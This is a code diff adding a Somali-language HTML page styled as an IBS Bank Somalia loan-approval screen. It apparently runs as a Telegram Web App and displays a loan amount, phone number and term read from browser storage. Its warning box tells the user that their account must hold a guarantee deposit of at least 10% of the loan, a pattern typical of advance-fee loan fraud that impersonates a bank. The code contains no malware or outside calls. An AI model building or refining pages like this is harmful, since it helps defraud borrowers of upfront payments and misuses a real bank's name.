@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>IBS Bank Somalia - Guul (Success)</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --ibs-primary: #002B49;
+            --ibs-gradient: linear-gradient(180deg, #00406b 0%, #002B49 100%);
+            --bg-ibs: #002B49;
+            --card-bg: #ffffff;
+            --text-dark: #111111;
+            --text-gray: #666666;
+            --warning-bg: #fdfbf2;
+            --warning-border: #f3ebc8;
+            --warning-title: #d97706;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-ibs);
+            margin: 0;
+            padding: 20px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .screen-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--card-bg);
+            border-radius: 28px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .check-circle {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #00406b, #001d32);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 16px rgba(0, 43, 73, 0.3);
+        }
+
+        .congrats-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #000000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .sub-text {
+            color: var(--text-gray);
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        .amount-box {
+            width: 100%;
+            background: linear-gradient(180deg, #00406b 0%, #002B49 100%);
+            border-radius: 16px;
+            padding: 22px 15px;
+            text-align: center;
+            color: white;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0, 43, 73, 0.25);
+        }
+
+        .amount-label {
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            opacity: 0.95;
+            margin-bottom: 8px;
+        }
+
+        .amount-value {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+        }
+
+        .info-card {
+            width: 100%;
+            background-color: var(--warning-bg);
+            border: 1.5px solid var(--warning-border);
+            border-radius: 16px;
+            padding: 20px 18px;
+            margin-bottom: 25px;
+        }
+
+        .info-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            color: var(--warning-title);
+            font-weight: 800;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .info-body {
+            font-size: 13.5px;
+            line-height: 1.55;
+            color: #4a4a4a;
+        }
+
+        .details-list {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .details-heading {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .detail-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 16px;
+        }
+
+        .icon-bg {
+            width: 44px;
+            height: 44px;
+            background-color: #e6edf4;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .detail-label {
+            font-size: 11px;
+            color: var(--text-gray);
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .detail-val {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .action-title {
+            width: 100%;
+            font-weight: 800;
+            margin: 15px 0 12px;
+            color: var(--ibs-primary);
+            font-size: 15px;
+        }
+
+        .btn-list {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-white {
+            background: white;
+            border: 1px solid #e2e8f0;
+            padding: 14px 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            color: var(--text-dark);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .next-steps {
+            width: 100%;
+            background-color: #f8f9fa;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #edf2f7;
+        }
+
+        .home-btn {
+            background-color: var(--ibs-primary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="screen-container">
+        
+        <div class="check-circle">✓</div>
+        
+        <div class="congrats-title">
+            <span>🎉</span> Hambalyo!
+        </div>
+
+        <div class="sub-text">
+            Codsigaaga deynta waa la <b>ansixiyey!</b> Lacagta waxaa laguugu soo shubi doonaa dhawaan.
+        </div>
+
+        <div class="amount-box">
+            <div class="amount-label">LACAGTA LA ANSIXIYEY</div>
+            <div class="amount-value" id="display-amount">2,500 $</div>
+        </div>
+
+        <div class="info-card">
+            <div class="info-header">⚠️ OGEEYSIIS KU SAABSAN AMMAANKA</div>
+            <div class="info-body">
+                Koontadaada IBS Bank waa inay ahaataa mid shaqeyneysa oo xajineysa deebaaji dammaanad ah oo ah ugu yaraan <b>10% lacagta deynta ah</b>. Lacagtan waa la soo celinayaa marka deynta si guul leh loo bixiyo.
+            </div>
+        </div>
+
+        <div class="details-list">
+            <div class="details-heading">
+                <span>💳</span> Faahfaahinta Deynta
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">🇸🇴</div>
+                <div>
+                    <div class="detail-label"> LAMBARKA TELEFOONKA</div>
+                    <div class="detail-val" id="display-phone">+252 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">BIXINTA BISHII</div>
+                    <div class="detail-val" id="display-monthly">218 $</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">MUDDADA DEYNTA</div>
+                    <div class="detail-val" id="display-term">12 Bilood</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📈</div>
+                <div>
+                    <div class="detail-label">FAA'IIDADA / QIImaha</div>
+                    <div class="detail-val">5% Sanadkii (Sharia)</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="action-title">Ficillada Degdegga ah</div>
+        <div class="btn-list">
+            <div class="btn-white">💰 Dhigasho (Deposit)</div>
+            <div class="btn-white">💸 Bixinta (Withdraw)</div>
+            <div class="btn-white">📄 Faahfaahin</div>
+        </div>
+
+        <div class="next-steps">
+            <div style="font-weight: 800; color: var(--ibs-primary); margin-bottom: 6px; font-size: 14px;">📱 Tallaabada xigta:</div>
+            <div style="font-size: 13.5px; color: var(--text-gray); line-height: 1.45;">
+                Waxaad heli doontaa SMS iyo Email ku saabsan faahfaahinta wareejinta lacagta 24 saacadood gudahood.
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/page1'">🏠 Ku Noqo Bogga Hore</button>
+
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+            const loanAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || "2500";
+            const loanTerm = localStorage.getItem('loan_term') || localStorage.getItem('duration') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || "218";
+
+            const formattedAmount = Number(loanAmount).toLocaleString() + " $";
+            const formattedMonthly = Number(monthlyPay).toLocaleString() + " $";
+            const formattedPhone = savedPhone ? `+252 ${savedPhone.replace(/^\+?252/, '')}` : "+252 ...";
+
+            document.getElementById('display-amount').innerText = formattedAmount;
+            document.getElementById('display-phone').innerText = formattedPhone;
+            document.getElementById('display-term').innerText = loanTerm + " Bilood";
+            document.getElementById('display-monthly').innerText = formattedMonthly;
+        });
+    </script>
+</body>
+</html>
